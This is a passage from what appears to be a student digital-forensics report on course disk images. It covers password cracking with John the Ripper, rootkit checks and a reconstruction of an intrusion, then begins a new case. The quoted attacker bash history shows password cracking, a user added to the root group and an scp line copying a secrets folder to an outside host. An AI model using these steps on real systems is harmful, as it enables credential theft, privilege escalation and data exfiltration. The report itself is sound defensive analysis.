<h4 id="orgab0c33b"><span class="section-number-4">4.2.20</span> John The Ripper</h4>
<div class="outline-text-4" id="text-4-2-20">
<p>
<a id="org156f8a9"></a>
</p>

<p>
!This is done on my local computer!
</p>

<p>
I downloaded the <b>passwd</b> file from the system to my local
computer and executed <code>john</code> on the file.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 70: </span>Results</label><pre class="src src-text">password1        (mike)
password         (guest)
tuesday2         (root)
baseball8        (fred)
cars1            (john)
2345b            (bill)
</pre>
</div>

<p>
As we can see the user <b>mike</b> have a very week password. This
would not take long to find with a standard dictionary attack.
I didnt run <code>john</code> long enought to get <b>Freds</b> password.
</p>
</div>
</div>

<div id="outline-container-org99cb1f9" class="outline-4">
<h4 id="org99cb1f9"><span class="section-number-4">4.2.21</span> Check for rootkits</h4>
<div class="outline-text-4" id="text-4-2-21">
<p>
<a id="org10b924b"></a>
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 71: </span>Commands</label><pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> /images/chkrootkit-0.47
sudo ./chkrootkit -r /images/sda1/
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 72: </span>Results</label><pre class="src src-text">ROOTDIR is `/images/sda1/'
Checking `amd'... not found
Checking `basename'... not infected
Checking `biff'... not infected
Checking `chfn'... not infected
Checking `chsh'... not infected
Checking `cron'... not infected
Checking `crontab'... not infected
Checking `date'... not infected
Checking `du'... not infected
Checking `dirname'... not infected
Checking `echo'... not infected
Checking `egrep'... not infected
Checking `env'... not infected
Checking `find'... not infected
Checking `fingerd'... not found
Checking `gpm'... not found
Checking `grep'... not infected
Checking `hdparm'... not found
Checking `su'... not infected
Checking `ifconfig'... not infected
Checking `inetd'... not infected
Checking `inetdconf'... not infected
Checking `identd'... not found
Checking `init'... not infected
Checking `killall'... not infected
Checking `ldsopreload'... not infected
Checking `login'... not infected
Checking `ls'... not infected
Checking `lsof'... not infected
Checking `mail'... not infected
Checking `mingetty'... not found
Checking `netstat'... not infected
Checking `named'... not found
Checking `passwd'... not infected
Checking `pidof'... not infected
Checking `pop2'... not found
Checking `pop3'... not found
Checking `ps'... not infected
Checking `pstree'... not infected
Checking `rpcinfo'... not infected
Checking `rlogind'... not found
Checking `rshd'... not found
Checking `slogin'... not infected
Checking `sendmail'... not infected
Checking `sshd'... not infected
Checking `syslogd'... not infected
Checking `tar'... not infected
Checking `tcpd'... not infected
Checking `tcpdump'... not infected
Checking `top'... not infected
Checking `telnetd'... not found
Checking `timed'... not found
Checking `traceroute'... not found
Checking `vdir'... not infected
Checking `w'... not infected
Checking `write'... not infected
Checking `aliens'... no suspect files
Searching for sniffer's logs, it may take a while... nothing found
Searching for HiDrootkit's default dir... nothing found
Searching for t0rn's default files and dirs... nothing found
Searching for t0rn's v8 defaults... nothing found
Searching for Lion Worm default files and dirs... nothing found
Searching for RSHA's default files and dir... nothing found
Searching for RH-Sharpe's default files... nothing found
Searching for Ambient's rootkit (ark) default files and dirs... nothing found
Searching for suspicious files and dirs, it may take a while... nothing found
Searching for LPD Worm files and dirs... nothing found
Searching for Ramen Worm files and dirs... nothing found
Searching for Maniac files and dirs... nothing found
Searching for RK17 files and dirs... nothing found
Searching for Ducoci rootkit... nothing found
Searching for Adore Worm... nothing found
Searching for ShitC Worm... nothing found
Searching for Omega Worm... nothing found
Searching for Sadmind/IIS Worm... nothing found
Searching for MonKit... nothing found
Searching for Showtee... nothing found
Searching for OpticKit... nothing found
Searching for T.R.K... nothing found
Searching for Mithra... nothing found
Searching for OBSD rk v1... nothing found
Searching for LOC rootkit... nothing found
Searching for Romanian rootkit... nothing found
Searching for Suckit rootkit... nothing found
Searching for Volc rootkit... nothing found
Searching for Gold2 rootkit... nothing found
Searching for TC2 Worm default files and dirs... nothing found
Searching for Anonoying rootkit default files and dirs... nothing found
Searching for ZK rootkit default files and dirs... nothing found
Searching for ShKit rootkit default files and dirs... nothing found
Searching for AjaKit rootkit default files and dirs... nothing found
Searching for zaRwT rootkit default files and dirs... nothing found
Searching for Madalin rootkit default files... nothing found
Searching for Fu rootkit default files... nothing found
Searching for ESRK rootkit default files... nothing found
Searching for rootedoor... nothing found
Searching for ENYELKM rootkit default files... nothing found
Searching for anomalies in shell history files... nothing found
Checking `asp'... not infected
Checking `bindshell'... not tested
Checking `lkm'... chkproc: not tested
Checking `rexedcs'... not found
Checking `sniffer'... not tested
Checking `w55808'... not infected
Checking `wted'... chkwtmp: nothing deleted
Checking `scalper'... not infected
Checking `slapper'... not infected
Checking `z2'... chklastlog: nothing deleted
Checking `chkutmp'... chkutmp: nothing deleted
</pre>
</div>
</div>
</div>

<div id="outline-container-org0f550f3" class="outline-4">
<h4 id="org0f550f3"><span class="section-number-4">4.2.22</span> Search for deleted files on Ext2.</h4>
<div class="outline-text-4" id="text-4-2-22">
<p>
<a id="org7031e1f"></a>
</p>

<p>
Searching for deleted files on a Ext2 disk.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 73: </span>Commands (Need to be executed in a shell)</label><pre class="src src-sh">sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 74: </span>Results</label><pre class="src src-text">e2undel 0.82
Trying to recover files on /dev/loop0, saving them on /images/recovered

/dev/loop0 opened for read-only access
/dev/loop0 was not cleanly unmounted.
Do you want wo continue (y/n)? 182784 inodes (161628 free)
365470 blocks of 4096 bytes (313998 free)
last mounted on Tue May 13 15:39:02 2008
no entries for /dev/loop0 in log file
searching for deleted inodes on /dev/loop0:
182784 inodes scanned, 194 deleted files found

   user name |  &lt; 12 h |  &lt; 48 h |   &lt; 7 d |  &lt; 30 d |   &lt; 1 y |   older
-------------+---------+---------+---------+---------+---------+--------
        root |       0 |       0 |      11 |       0 |       0 |       0
        1002 |       0 |       0 |     183 |       0 |       0 |       0
</pre>
</div>
</div>
</div>

<div id="outline-container-orgec58637" class="outline-4">
<h4 id="orgec58637"><span class="section-number-4">4.2.23</span> Look for tmp files</h4>
<div class="outline-text-4" id="text-4-2-23">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 75: </span>Commands</label><pre class="src src-sh">ls -lRa /images/sda1/tmp
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 76: </span>Results</label><pre class="src src-text">/images/sda1/tmp:
total 8
drwxrwxrwt  2 root root 4096 2007-09-10 04:22 .
drwxr-xr-x 21 root root 4096 2007-09-10 03:07 ..
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-orgfe6dc9d" class="outline-3">
<h3 id="orgfe6dc9d"><span class="section-number-3">4.3</span> Report findings</h3>
<div class="outline-text-3" id="text-4-3">
<p>
Mikes account got compromissed via SSH at <span class="timestamp-wrapper"><span class="timestamp">&lt;2007-09-10 Mon 04:00&gt;</span></span>
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 77: </span>Commands</label><pre class="src src-sh">sudo sed -n <span style="color: #CC9393;">'26p;27p'</span> /images/sda1/var/log/auth.log
<span style="color: #5F7F5F;">#</span><span style="color: #7F9F7F;">sudo cat -n /images/sda1/var/log/auth.log</span>
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 78: </span>Results</label><pre class="src src-text">Sep 10 04:00:15 yoyodyne sshd[2229]: Accepted password for mike from 193.252.122.103 port 57720 ssh2
Sep 10 04:00:15 yoyodyne PAM_unix[2231]: (ssh) session opened for user mike by (uid=1002)
</pre>
</div>

<p>
The reason why <b>mikes</b> account got compromised was because of the
simple password. See <a href="#org156f8a9">4.2.20</a> for more info.
</p>

<p>
From Mikes account the cracker downloaded John The Ripper on the
system and cracked the passwords for all of the users on the
system. And then escalated priviledges to root.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 79: </span>Commands</label><pre class="src src-sh">sudo sed -n <span style="color: #CC9393;">'13p;28p;30p;37,39p;53,54p'</span> /images/sda1/home/mike/.bash_history
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 80: </span>Results</label><pre class="src src-text">cp /etc/passwd calendar.txt
lynx http://www.openwall.com/john/f/john-1.7.2.tar.gz
tar -xvzf john-1.7.2.tar.gz
make
make | less
make linux-x86-mmx
./john calendar.txt
su -
</pre>
</div>

<p>
When the cracker got hold of the root account she created a new
user on the system. And logged in as that user.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 81: </span>Commands</label><pre class="src src-sh">sudo sed -n <span style="color: #CC9393;">'65,70p'</span> /images/sda1/root/.bash_history
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 82: </span>Results</label><pre class="src src-text">adduser jake
cat /etc/group
vi /etc/group
ssh jake@localhost
whoami
rm -rf ~mike/john-1.7.2*
</pre>
</div>

<p>
The user Jake was added to the root group. That user would then
get full system permissions.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 83: </span>Commands</label><pre class="src src-sh">sudo head -n 1 /images/sda1/etc/group
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 84: </span>Results</label><pre class="src src-text">root:*:0:jake
</pre>
</div>

<p>
The new user jake was create at 04:21:05. And the cracker loggin to
that account at 04:23:15. The login was made with <i>ssh</i> from
localhost.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 85: </span>Commands</label><pre class="src src-sh">sudo sed -n <span style="color: #CC9393;">'72,76p;79,81p'</span> /images/sda1/var/log/auth.log
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 86: </span>Results</label><pre class="src src-text">Sep 10 04:21:05 yoyodyne groupadd[2654]: new group: name=jake, gid=1006
Sep 10 04:21:05 yoyodyne useradd[2655]: new user: name=jake, uid=1006, gid=1006, home=/home/jake, shell=/bin/bash
Sep 10 04:21:21 yoyodyne PAM_unix[2658]: Password for jake was changed
Sep 10 04:21:51 yoyodyne chfn[2659]: changed user `jake' information.
Sep 10 04:22:17 yoyodyne chfn[2660]: changed user `jake' information.
Sep 10 04:23:15 yoyodyne sshd[2666]: Accepted password for jake from 127.0.0.1 port 1028 ssh2
Sep 10 04:23:15 yoyodyne PAM_unix[2668]: (ssh) session opened for user jake by (uid=1006)
Sep 10 04:26:24 yoyodyne PAM_unix[2668]: (ssh) session closed for user jake
</pre>
</div>

<p>
After logging in as user <b>jake</b> the cracker copied the <b>/secrets</b>
folder to her home. Transfer it to her home host and then renamed
the folder.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 87: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/home/jake/.bash_history
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 88: </span>Results</label><pre class="src src-text">cp -r /secrets .
ls
scp -r secrets d000d@207.92.30.41   :~/
ls
mv secrets .elinks
ls
ls -alh
</pre>
</div>
</div>
</div>

<div id="outline-container-orgc7ff045" class="outline-3">
<h3 id="orgc7ff045"><span class="section-number-3">4.4</span> Recommended steps before returning to production</h3>
<div class="outline-text-3" id="text-4-4">
<p>
Set up a decent password policy for the users. A recommended way
of doing this is with a <a href="http://www.openwall.com/pam/">PAM</a> module from <a href="http://www.openwall.com/pam/">Openwall</a>.  Openwall is the
author of <b>John The Ripper</b>.
</p>


<p>
Reset all password on the system acording to the new rules.
</p>


<p>
Remove the user <b>jake</b>.
</p>
</div>
</div>

<div id="outline-container-org4187bd1" class="outline-3">
<h3 id="org4187bd1"><span class="section-number-3">4.5</span> Time estimation</h3>
<div class="outline-text-3" id="text-4-5">
<p>
8 hours.
</p>
</div>
</div>

<div id="outline-container-org1ade031" class="outline-3">
<h3 id="org1ade031"><span class="section-number-3">4.6</span> Conclusion</h3>
<div class="outline-text-3" id="text-4-6">
<p>
Someone stole the secret info and the server was compromised. But
if it was our suspect is hard to say. The IP that entered mikes
account is not the same as the one belonging to our victim. But she
could have used a jump host to do that from.
</p>
</div>
</div>
</div>

<div id="outline-container-org2802d47" class="outline-2">
<h2 id="org2802d47"><span class="section-number-2">5</span> Forensic Report Act 3: The Wealthy Individual</h2>
<div class="outline-text-2" id="text-5">
</div>

<div id="outline-container-org62268cd" class="outline-3">
<h3 id="org62268cd"><span class="section-number-3">5.1</span> Executive summary</h3>
<div class="outline-text-3" id="text-5-1">
<p>
When you got back after lunch, there was already someone in the office. You could tell
from the tux, tails, and British accent that he was a butler, but before you could
offer him a drink he handed you the biggest diamond-encrusted hard drive you&rsquo;d ever
seen. Now, it&rsquo;s a fundamental truth that money attracts crooks like Martians attract
germs, so you weren&rsquo;t exactly surprised when he told you that his employer&rsquo;s computer
had recently been broken into. What was surprising was the M.O. &#x2013; the crooks deleted
the boss&rsquo; files to show they were serious, and then they encrypted his swiss bank
account access codes and held the decryption keys ransom for 1 megabucks. The boss
needs the access codes to do business, but he doesn&rsquo;t want to cave in, either. At this
point, he doesn&rsquo;t care about his computer, and he doesn&rsquo;t particularly care how they
got in (although he&rsquo;ll give you some extra dough if you figure out who was
responsible). He&rsquo;s just hoping that you can find a way to decrypt the codes so he
doesn&rsquo;t have to pay those lowlifes. If you can do it, he&rsquo;ll give you a cut of the 2^20
dollars&#x2026; and that&rsquo;ll keep you in patty melts at Norm&rsquo;s for a long time. Hint: A few
of these bank codes are really hard to find. Don&rsquo;t sweat it if you can&rsquo;t find every one
&#x2013; 6 out of 8 is worth full marks &#x2013; but of course you&rsquo;ll get some extra credit if you
collect &rsquo;em all.
</p>
</div>
</div>

<div id="outline-container-orgfb61452" class="outline-3">
<h3 id="orgfb61452"><span class="section-number-3">5.2</span> Methodology</h3>
<div class="outline-text-3" id="text-5-2">
</div>
<div id="outline-container-orgae00818" class="outline-4">
<h4 id="orgae00818"><span class="section-number-4">5.2.1</span> Download image</h4>
<div class="outline-text-4" id="text-5-2-1">
<p>
Download the act3 assignemnt and check SHA hash.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 89: </span>Commands</label><pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> /images
sudo ./loadimage.sh act3.img
sha256sum act3.img
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 90: </span>Results</label><pre class="src src-text">Loading image. Please wait...
Decompressing image. Please wait...
Done.
650acd37f813ee4083baa944a67be675052257e986a642422138998a1d14de6c  act3.img
</pre>
</div>
</div>
</div>

<div id="outline-container-org0c434b3" class="outline-4">
<h4 id="org0c434b3"><span class="section-number-4">5.2.2</span> Examin the image.</h4>
<div class="outline-text-4" id="text-5-2-2">
<p>
Examin the <code>/images/sda1</code> image that was loaded. The reason to do
this is to verify the offsetsto the partitions.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 91: </span>Commands</label><pre class="src src-sh">file /images/act3.img
fdisk -lu /images/act3.img
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 92: </span>Results</label><pre class="src src-text">/images/act3.img: x86 boot sector, LInux i386 boot LOader; GRand
Unified Bootloader, stage1 version 0x3, stage2 address 0x2000, stage2
segment 0x200; partition 1: ID=0x83, starthead 1, startsector 63,
2923767 sectors; partition 2: ID=0x82, starthead 0, startsector
2923830, 979965 sectors; partition 3: ID=0x82, starthead 0,
startsector 3903795, 996030 sectors, code offset 0x48

Disk /images/act3.img: 0 MB, 0 bytes
255 heads, 63 sectors/track, 0 cylinders, total 0 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x55078e84

           Device Boot      Start         End      Blocks   Id  System
/images/act3.img1              63     2923829     1461883+  83  Linux
/images/act3.img2         2923830     3903794      489982+  82  Linux swap / Solaris
/images/act3.img3         3903795     4899824      498015   82  Linux swap / Solaris
</pre>
</div>


<p>
Here is a table with the offsets that is found on the disk.  We can
see that there is three paritions on the disk.
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-right" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Parition</th>
<th scope="col" class="org-right">Start</th>
<th scope="col" class="org-right">Offset</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">act3.img1</td>
<td class="org-right">63</td>
<td class="org-right">32256</td>
</tr>

<tr>
<td class="org-left">act3.img2</td>
<td class="org-right">2923830</td>
<td class="org-right">1497000960</td>
</tr>

<tr>
<td class="org-left">act3.img3</td>
<td class="org-right">3903795</td>
<td class="org-right">1998743040</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-org440ba8a" class="outline-4">
<h4 id="org440ba8a"><span class="section-number-4">5.2.3</span> Mount a root partition.</h4>
<div class="outline-text-4" id="text-5-2-3">
<p>
Mount the first &ldquo;loop0&rdquo; to <code>/images/sda1</code>, this is the file system
to examin.  This disk should be the root disk where users and
systems is. The partition is mounted as read only.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 93: </span>Commands</label><pre class="src src-sh">sudo losetup /dev/loop0 /images/act3.img -o 32256
sudo mount /dev/loop0 /images/sda1 -t ext2 -o ro
df -Th | grep /images/sda1
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 94: </span>Results</label><pre class="src src-text">/dev/loop0    ext2    1.4G  483M  842M  37% /images/sda1
</pre>
</div>
</div>
</div>

<div id="outline-container-org42574af" class="outline-4">
<h4 id="org42574af"><span class="section-number-4">5.2.4</span> Mount swap 1</h4>
<div class="outline-text-4" id="text-5-2-4">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 95: </span>Commands</label><pre class="src src-sh">sudo losetup /dev/loop1 /images/act3.img -o 1497000960
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 96: </span>Results</label><pre class="src src-text">
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 97: </span>Commands</label><pre class="src src-sh">file /dev/loop1
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 98: </span>Results</label><pre class="src src-text">/dev/loop1: block special
</pre>
</div>
</div>
</div>

<div id="outline-container-org9d5ff8e" class="outline-4">
<h4 id="org9d5ff8e"><span class="section-number-4">5.2.5</span> Mount swap 2</h4>
<div class="outline-text-4" id="text-5-2-5">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 99: </span>Commands</label><pre class="src src-sh">sudo losetup /dev/loop2 /images/act3.img -o 1998743040
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 100: </span>Results</label><pre class="src src-text">
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 101: </span>Commands</label><pre class="src src-sh">file /dev/loop2
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 102: </span>Results</label><pre class="src src-test">/dev/loop2: block special
</pre>
</div>
</div>
</div>

<div id="outline-container-org9146c2b" class="outline-4">
<h4 id="org9146c2b"><span class="section-number-4">5.2.6</span> Get operating system</h4>
<div class="outline-text-4" id="text-5-2-6">
<p>
What operating system are the examining host running.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 103: </span>Commands</label><pre class="src src-sh">cat /images/sda1/etc/issue
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 104: </span>Results</label><pre class="src src-text">Ubuntu 6.06.1 LTS \n \l
</pre>
</div>
</div>
</div>

<div id="outline-container-org8d4a6c9" class="outline-4">
<h4 id="org8d4a6c9"><span class="section-number-4">5.2.7</span> Get time zone</h4>
<div class="outline-text-4" id="text-5-2-7">
<p>
What time zone was configured to the host.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 105: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/etc/timezone
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 106: </span>Results</label><pre class="src src-text">US/Pacific
</pre>
</div>
</div>
</div>

<div id="outline-container-org4e3970f" class="outline-4">
<h4 id="org4e3970f"><span class="section-number-4">5.2.8</span> Look at /</h4>
<div class="outline-text-4" id="text-5-2-8">
<p>
Look at the root directory of the mounted system.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 107: </span>Commands</label><pre class="src src-sh">ls -la /images/sda1
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 108: </span>Results</label><pre class="src src-text">total 74
drwxr-xr-x 21 root root  1024 2007-09-15 11:05 .
drwxr-xr-x  6 root root  4096 2007-09-15 10:54 ..
drwxr-xr-x  2 root root  2048 2007-09-07 18:52 bin
drwxr-xr-x  3 root root  1024 2007-09-07 18:55 boot
lrwxrwxrwx  1 root root    11 2007-09-07 11:28 cdrom -&gt; media/cdrom
drwxr-xr-x 11 root root 29696 2007-09-07 11:39 dev
drwxr-xr-x 57 root root  3072 2007-09-10 00:38 etc
drwxr-xr-x  7 root root  1024 2007-09-10 00:05 home
drwxr-xr-x  2 root root  1024 2007-09-07 11:30 initrd
lrwxrwxrwx  1 root root    32 2007-09-07 18:55 initrd.img -&gt; boot/initrd.img-2.6.15-29-server
lrwxrwxrwx  1 root root    32 2007-09-07 11:35 initrd.img.old -&gt; boot/initrd.img-2.6.15-26-server
drwxr-xr-x 16 root root  5120 2007-09-07 18:52 lib
drwxr-xr-x  2 root root 12288 2007-09-07 11:28 lost+found
drwxr-xr-x  3 root root  1024 2007-09-07 11:28 media
drwxr-xr-x  2 root root  1024 2006-08-03 03:59 mnt
drwxr-xr-x  2 root root  1024 2007-09-07 11:30 opt
drwxr-xr-x  2 root root  1024 2006-08-03 03:59 proc
drwxr-xr-x  4 root root  1024 2007-09-10 00:25 root
drwxr-xr-x  2 root root  4096 2007-09-07 18:52 sbin
drwxr-xr-x  2 root root  1024 2007-09-07 11:30 srv
drwxr-xr-x  2 root root  1024 2006-05-21 11:46 sys
drwxrwxrwt  3 root root  1024 2007-09-09 22:38 tmp
drwxr-xr-x 10 root root  1024 2007-09-07 11:30 usr
drwxr-xr-x 13 root root  1024 2007-09-07 11:30 var
lrwxrwxrwx  1 root root    29 2007-09-07 18:55 vmlinuz -&gt; boot/vmlinuz-2.6.15-29-server
lrwxrwxrwx  1 root root    29 2007-09-07 11:35 vmlinuz.old -&gt; boot/vmlinuz-2.6.15-26-server
</pre>
</div>
</div>
</div>

<div id="outline-container-org7cf5886" class="outline-4">
<h4 id="org7cf5886"><span class="section-number-4">5.2.9</span> Look for users</h4>
<div class="outline-text-4" id="text-5-2-9">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 109: </span>Commands</label><pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> /images/sda1
ls -la home/
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 110: </span>Results</label><pre class="src src-text">total 7
drwxr-xr-x  7 root  root 1024 2007-09-10 00:05 .
drwxr-xr-x 21 root  root 1024 2007-09-15 11:05 ..
drwxr-xr-x  3  1004 1004 1024 2007-09-10 00:12 chef
drwxr-xr-x  3  1003 1003 1024 2007-09-10 00:26 gardener
drwxr-xr-x  3  1002 1002 1024 2007-09-09 18:53 jeeves
drwxr-xr-x  8  1001 1001 1024 2007-09-09 18:58 rich
drwxr-xr-x  2 tuser 1000 1024 2007-09-09 16:27 ubuntu
</pre>
</div>

<p>
How about with <code>passwd</code>?
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 111: </span>Commands</label><pre class="src src-sh">cat /images/sda1/etc/passwd
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 112: </span>Results</label><pre class="src src-text">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
dhcp:x:101:101::/nonexistent:/bin/false
syslog:x:102:102::/home/syslog:/bin/false
klog:x:103:103::/home/klog:/bin/false
ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash
sshd:x:100:65534::/var/run/sshd:/bin/false
rich:x:1001:1001:I. M. Rich,,,:/home/rich:/bin/bash
jeeves:x:1002:1002:Mr. Jeeves,,,:/home/jeeves:/bin/bash
gardener:x:1003:1003:Old Toby,,,:/home/gardener:/bin/bash
chef:x:1004:1004:Monsieur Le Creuset,,,:/home/chef:/bin/bash
</pre>
</div>
</div>
</div>

<div id="outline-container-org6febfb9" class="outline-4">
<h4 id="org6febfb9"><span class="section-number-4">5.2.10</span> Look for groups</h4>
<div class="outline-text-4" id="text-5-2-10">
<p>
Look at the groups file.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 113: </span>Commands</label><pre class="src src-sh">cat /images/sda1/etc/group
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 114: </span>Results</label><pre class="src src-text">root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:ubuntu
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:ubuntu
fax:x:21:
voice:x:22:
cdrom:x:24:ubuntu
floppy:x:25:ubuntu
tape:x:26:
sudo:x:27:
audio:x:29:ubuntu
dip:x:30:ubuntu
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:ubuntu
sasl:x:45:
plugdev:x:46:ubuntu
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
dhcp:x:101:
syslog:x:102:
klog:x:103:
crontab:x:104:
ssh:x:105:
ubuntu:x:1000:
lpadmin:x:106:ubuntu
scanner:x:107:ubuntu
admin:x:108:ubuntu
rich:x:1001:
jeeves:x:1002:
gardener:x:1003:
chef:x:1004:
</pre>
</div>
</div>
</div>

<div id="outline-container-org7061f29" class="outline-4">
<h4 id="org7061f29"><span class="section-number-4">5.2.11</span> Look at lastlog</h4>
<div class="outline-text-4" id="text-5-2-11">
<p>
Lastlog is a logfile that shows the last time a user logged in.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 115: </span>Commands (Needs to be executed in a shell)</label><pre class="src src-sh">sudo chroot /images/sda1/
lastlog
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 116: </span>Results</label><pre class="src src-text">
</pre>
</div>

<p>
Lastlog file is empty
</p>
</div>
</div>

<div id="outline-container-org901b3c8" class="outline-4">
<h4 id="org901b3c8"><span class="section-number-4">5.2.12</span> Hosts</h4>
<div class="outline-text-4" id="text-5-2-12">
<p>
Look at hosts file.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 117: </span>Commands</label><pre class="src src-sh">cat /images/sda1/etc/hosts
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 118: </span>Results</label><pre class="src src-text">127.0.0.1       localhost
127.0.1.1       ubuntu.tastytronic.net  ubuntu

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
</pre>
</div>
</div>
</div>

<div id="outline-container-org92f99de" class="outline-4">
<h4 id="org92f99de"><span class="section-number-4">5.2.13</span> Rich account</h4>
<div class="outline-text-4" id="text-5-2-13">
<p>
Look at the users home dirs.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 119: </span>Commands</label><pre class="src src-sh">sudo find /images/sda1/home/rich -maxdepth 2 -name <span style="color: #CC9393;">"*"</span>
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 120: </span>Results</label><pre class="src src-text">/images/sda1/home/rich
/images/sda1/home/rich/.bashrc
/images/sda1/home/rich/.bash_profile
/images/sda1/home/rich/.bash_logout
/images/sda1/home/rich/.extrtmtc
/images/sda1/home/rich/.extrtmtc/key4
/images/sda1/home/rich/swiss_keys
/images/sda1/home/rich/swiss_keys/swisskey3.gpg
/images/sda1/home/rich/swiss_keys/swisskey4.gpg
/images/sda1/home/rich/swiss_keys/swisskey5.gpg
/images/sda1/home/rich/swiss_keys/swisskey6.gpg
/images/sda1/home/rich/swiss_keys/swisskey7.gpg
/images/sda1/home/rich/swiss_keys/swisskey1.gpg
/images/sda1/home/rich/swiss_keys/swisskey2.gpg
